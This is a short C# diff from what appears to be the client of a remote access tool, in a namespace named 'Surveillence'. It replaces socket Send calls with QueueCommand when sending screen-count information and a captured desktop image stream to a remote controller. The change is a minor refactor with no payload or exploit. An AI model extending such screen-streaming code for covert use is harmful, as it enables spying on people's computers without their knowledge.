@@ -51,7 +51,7 @@ namespace Axeno.Client.Networking.Functions.Surveillence
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "RemoteDesktopInformation";
             msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
-            ClientSocket.Send(msgpack.Encode2Bytes());
+            ClientSocket.QueueCommand(msgpack.Encode2Bytes());
         }
         public static void StartStreaming()
         {
@@ -74,7 +74,7 @@ namespace Axeno.Client.Networking.Functions.Surveillence
                     msgpack.ForcePathObject("Packet").AsString = "DesktopStream";
                     msgpack.ForcePathObject("Stream").SetAsBytes(desktopData);
 
-                    ClientSocket.Send(msgpack.Encode2Bytes());
+                    ClientSocket.QueueCommand(msgpack.Encode2Bytes());
                 }catch
                 {
                     streaming = false;
